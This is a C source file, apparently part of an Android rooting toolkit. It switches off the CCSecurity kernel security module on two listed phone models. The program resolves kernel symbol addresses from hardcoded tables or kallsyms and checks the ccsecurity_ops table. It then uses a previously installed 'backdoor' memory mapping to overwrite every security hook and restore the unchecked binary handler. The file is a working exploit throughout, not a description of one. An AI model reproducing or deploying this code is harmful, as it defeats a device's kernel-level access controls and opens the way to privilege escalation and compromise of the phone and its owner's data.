#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/system_properties.h>
#define _LARGEFILE64_SOURCE
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "device_database/device_database.h"
#include "kallsyms.h"
#include "backdoor_mmap.h"

#define MAX_CCS_SEARCH_BINARY_HANDLERS  2

typedef struct _supported_device {
  device_id_t device_id;
  unsigned long int ccsecurity_ops_address;
  unsigned long int search_binary_handler_address;
  unsigned long int __ccs_search_binary_handler_address[MAX_CCS_SEARCH_BINARY_HANDLERS];
} supported_device;

static supported_device supported_devices[] = {
  { DEVICE_L01E_V20b, 0xc0daeab0, 0xc0132310, { 0xc0208564, 0xc020aec0, }, },
  { DEVICE_L02E_V20a, 0xc0c145a0, 0xc0149c4c, { 0xc020e604, 0xc02110d4, }, },
};

static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);

static void *ccsecurity_ops;
static void *search_binary_handler;
static void **__ccs_search_binary_handler;

static bool
setup_variables(void)
{
  device_id_t device_id = detect_device();
  int i;

  for (i = 0; i < n_supported_devices; i++) {
    if (supported_devices[i].device_id == device_id) {
      ccsecurity_ops = (void *)supported_devices[i].ccsecurity_ops_address;
      search_binary_handler = (void *)supported_devices[i].search_binary_handler_address;
      __ccs_search_binary_handler = (void **)supported_devices[i].__ccs_search_binary_handler_address;
      break;
    }
  }

  if (!ccsecurity_ops) {
    ccsecurity_ops = (void *)kallsyms_get_symbol_address("ccsecurity_ops");
  }

  if (!search_binary_handler) {
    search_binary_handler = (void *)kallsyms_get_symbol_address("search_binary_handler");
  }

  return ccsecurity_ops && search_binary_handler;
}

#define NUM_CCSECURITY_OPS  39
#define BINARY_HANDLER_POS  35

static bool
disable_ccsecurity(void)
{
  void **p;
  int i;

  p = backdoor_convert_to_mmaped_address(ccsecurity_ops);

  if (p[BINARY_HANDLER_POS] == search_binary_handler) {
    printf("Already disabled??\nUnlock anyway.");
  }
  else if (__ccs_search_binary_handler) {
    for (i = 0; i < MAX_CCS_SEARCH_BINARY_HANDLERS; i++) {
      if (__ccs_search_binary_handler[i] && p[BINARY_HANDLER_POS] == __ccs_search_binary_handler[i]) {
	break;
      }
    }

    if (i == MAX_CCS_SEARCH_BINARY_HANDLERS) {
      printf("check failed: ccsecurity_ops[%d] = %%p\n", BINARY_HANDLER_POS, p[BINARY_HANDLER_POS]);
      return false;
    }
  }
  else {
    char *name = kallsyms_get_symbol_by_address(p[BINARY_HANDLER_POS]);

    if (strcmp(name, "__ccs_search_binary_handler")) {
      printf("check failed: ccsecurity_ops[%d] = %s\n", BINARY_HANDLER_POS, name);
      free(name);
      return false;
    }

    free(name);
  }

  for (i = 0; i < NUM_CCSECURITY_OPS; i++) {
    switch (i) {
    case BINARY_HANDLER_POS:
      p[i] = search_binary_handler;
      break;
    default:
      p[i] = 0;
    }
  }

  return true;
}

static bool
run_exploit(void)
{
  bool ret;

  if (!backdoor_open_mmap()) {
    printf("Failed to mmap due to %s.\n", strerror(errno));
    printf("Run 'install_backdoor' first\n");

    return false;
  }

  ret = disable_ccsecurity();

  backdoor_close_mmap();
  return ret;
}

int
main(int argc, char **argv)
{
  if (!setup_variables()) {
    print_reason_device_not_supported();
    exit(EXIT_FAILURE);
  }

  if (!run_exploit()) {
    printf("Disable ccsecurity failed\n");
    exit(EXIT_FAILURE);
  }

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
